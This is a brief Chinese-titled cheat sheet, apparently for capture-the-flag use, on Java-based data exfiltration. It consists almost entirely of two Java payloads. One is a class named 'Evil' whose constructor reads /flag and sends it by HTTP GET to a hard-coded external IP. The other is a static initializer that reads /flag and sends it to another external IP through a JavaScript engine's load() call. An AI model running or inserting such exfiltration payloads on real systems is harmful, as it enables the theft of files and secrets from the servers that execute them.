# Java外带

```java
import java.io.BufferedReader;
import java.io.FileReader;
import java.net.HttpURLConnection;
import java.net.URL;
public class Evil {
    public Evil() throws Exception{
        String flag = "";
        String str;
        BufferedReader in = new BufferedReader(new FileReader("/flag"));
        while ((str = in.readLine()) != null) {
            flag += str;
        }
        System.out.println(flag);
        URL url = new URL("http://121.5.169.223:39454/?flag="+flag);
        HttpURLConnection con = (HttpURLConnection) url.openConnection();
        con.setRequestMethod("GET");

        //添加请求头
        con.setRequestProperty("User-Agent", "feng");
        int responseCode = con.getResponseCode();
    }
}

```

```java
static {
        String flag ="";
        try {
            BufferedReader in = new BufferedReader(new FileReader("/flag"));
            flag = in.readLine();;
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException ex) {
            ex.printStackTrace();
        }
        String url = "http://1.116.136.120:8989/?flag=" ;
        ScriptEngine engine1 = new ScriptEngineManager().getEngineByExtension("js");
        try {
            engine1.eval("load('"+url + flag + "')");
        } catch (ScriptException e) {
            e.printStackTrace();
        }
    }
```

